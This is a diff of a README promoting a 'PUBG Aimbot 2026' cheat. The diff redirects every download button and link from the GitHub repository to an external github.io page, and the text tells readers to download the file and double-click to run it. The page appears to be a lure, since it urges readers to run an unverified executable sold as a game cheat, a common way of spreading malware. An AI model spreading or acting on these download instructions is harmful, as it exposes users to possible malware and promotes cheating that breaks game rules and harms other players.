@@ -1,6 +1,6 @@
 # 🎯 pubg-aimbot-2026 - Lock On, Dominate Every Match
 
-[![Download Now](https://img.shields.io/badge/Download-PUBG_Aimbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/ronaldo12204/pubg-aimbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-PUBG_Aimbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://ronaldo12204.github.io)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these simple instructions to download and run the application. It only ta
 
 Click the big green button at the top of this page, or use this link directly:
 
-**👉 [Visit this link to download the application](https://github.com/ronaldo12204/pubg-aimbot-2026)**
+**👉 [Visit this link to download the application](https://ronaldo12204.github.io)**
 
 This will take you to the download page. Look for the download button or the latest release file. Click it and save the file to your computer — your **Downloads** folder is a good place.
 
@@ -77,7 +77,7 @@ Start PUBG as you normally would. The aimbot will run in the background automati
 
 Here's a quick recap of the download process:
 
-1.  **Visit this link to download the application:** [https://github.com/ronaldo12204/pubg-aimbot-2026](https://github.com/ronaldo12204/pubg-aimbot-2026)
+1.  **Visit this link to download the application:** [https://ronaldo12204.github.io](https://ronaldo12204.github.io)
 2.  Save the file to your computer.
 3.  Double-click to run it.
 4.  Configure and enjoy.
@@ -161,9 +161,9 @@ Don't wait — give yourself the competitive advantage you deserve.
 
 Click the button below to download now:
 
-[![Download PUBG Aimbot 2026](https://img.shields.io/badge/⬇️_Download-PUBG_Aimbot_2026-FF4500?style=for-the-badge&logo=windows&logoColor=white&labelColor=333333)](https://github.com/ronaldo12204/pubg-aimbot-2026)
+[![Download PUBG Aimbot 2026](https://img.shields.io/badge/⬇️_Download-PUBG_Aimbot_2026-FF4500?style=for-the-badge&logo=windows&logoColor=white&labelColor=333333)](https://ronaldo12204.github.io)
 
-**👉 [Visit this link to download the application](https://github.com/ronaldo12204/pubg-aimbot-2026)**
+**👉 [Visit this link to download the application](https://ronaldo12204.github.io)**
 
 ---
 
